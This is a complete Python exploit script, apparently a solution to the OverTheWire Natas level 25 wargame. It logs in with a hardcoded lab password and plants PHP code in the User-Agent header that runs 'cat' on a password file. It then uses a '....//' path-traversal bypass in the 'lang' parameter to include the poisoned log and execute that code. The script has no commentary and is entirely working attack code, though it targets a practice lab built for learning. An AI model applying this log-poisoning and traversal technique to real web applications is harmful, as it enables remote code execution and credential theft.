#!/bin/python
import requests

username = "natas25"
pwd = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = f"http://{username}.natas.labs.overthewire.org/"
session = requests.Session()
header={'User-Agent':'<? system("cat /etc/natas_webpass/natas26") ?>'}

res= session.get(url,auth=(username,pwd))
id=res.cookies['PHPSESSID']
data={'lang':f'....//....//....//....//....//var/www/natas/natas25/logs/natas25_{id}.log'}

res= session.post(url,data=data,headers=header,auth=(username,pwd))
print(res.text)